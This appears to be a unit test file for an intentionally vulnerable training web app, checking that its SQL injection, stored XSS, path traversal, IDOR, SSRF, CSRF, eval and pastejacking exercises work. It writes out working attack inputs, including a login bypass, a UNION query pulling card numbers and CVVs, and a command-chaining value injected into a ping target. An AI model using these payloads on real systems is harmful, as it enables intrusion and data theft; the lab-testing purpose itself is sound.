import unittest
from app import app
import database

class TestVulnLab(unittest.TestCase):
    def setUp(self):
        database.init_db(reset=True)
        self.client = app.test_client()

    def test_routes_200(self):
        routes = ['/', '/pastejack', '/sqli', '/xss', '/rce', '/traversal', '/ssrf', '/idor', '/csrf', '/deserial', '/.git/config']
        for r in routes:
            res = self.client.get(r)
            self.assertEqual(res.status_code, 200, f"Route {r} failed with {res.status_code}")

    def test_sqli_login_bypass(self):
        res = self.client.post('/sqli/login', data={'username': "admin' --", 'password': ''})
        self.assertEqual(res.status_code, 200)
        self.assertIn("Authentication Bypassed!", res.data.decode('utf-8'))
        self.assertIn("admin", res.data.decode('utf-8'))

    def test_sqli_union_search(self):
        payload = "' UNION SELECT id, full_name, credit_card, cvv, vault_code FROM sensitive_records --"
        res = self.client.get(f'/sqli/search?q={payload}')
        self.assertEqual(res.status_code, 200)
        self.assertIn("Sarah Connor", res.data.decode('utf-8'))
        self.assertIn("4532-8921-3091-7782", res.data.decode('utf-8'))

    def test_xss_stored(self):
        res = self.client.post('/xss/stored', data={'author': 'Attacker', 'comment': '<script>alert(1)</script>'})
        self.assertEqual(res.status_code, 302) # Redirects back
        res_view = self.client.get('/xss')
        self.assertIn("<script>alert(1)</script>", res_view.data.decode('utf-8'))

    def test_path_traversal(self):
        res = self.client.get('/traversal?file=../app.py')
        self.assertEqual(res.status_code, 200)
        self.assertIn("from flask import", res.data.decode('utf-8'))

    def test_idor_admin_leak(self):
        res = self.client.get('/api/user/1')
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data['username'], 'admin')
        self.assertIn('FLAG{admin_super_token', data['secret_api_key'])

    def test_eval_rce(self):
        res = self.client.post('/deserial', data={'action': 'eval', 'expression': '1337 * 2'})
        self.assertEqual(res.status_code, 200)
        self.assertIn('2674', res.data.decode('utf-8'))

    def test_rce_ping_chaining(self):
        # Test command chaining with echo
        res = self.client.post('/rce', data={'target': '127.0.0.1 & echo VULNLAB_RCE_CONFIRMED'})
        self.assertEqual(res.status_code, 200)
        self.assertIn('VULNLAB_RCE_CONFIRMED', res.data.decode('utf-8'))

    def test_ssrf_internal_metadata(self):
        res = self.client.get('/internal/cloud-metadata')
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn('FLAG{ssrf_internal_metadata_leaked_8819}', data['security_credentials']['Token'])

    def test_csrf_transfer(self):
        # Alice (session=2) transfers $100 to Charlie without anti-CSRF token
        res = self.client.post('/csrf/transfer', data={'recipient': 'charlie', 'amount': '100.00'})
        self.assertEqual(res.status_code, 302)
        # Check database
        conn = database.get_db()
        charlie = conn.execute("SELECT account_balance FROM users WHERE username = 'charlie'").fetchone()
        conn.close()
        self.assertEqual(charlie['account_balance'], 9000.25) # 8900.25 + 100.00

    def test_pastejack_page(self):
        res = self.client.get('/pastejack')
        self.assertEqual(res.status_code, 200)
        self.assertIn('js-hijack-container', res.data.decode('utf-8'))
        self.assertIn('pastejack-offscreen-payload', res.data.decode('utf-8'))
        self.assertIn('safe-paste-box', res.data.decode('utf-8'))

if __name__ == '__main__':
    unittest.main()
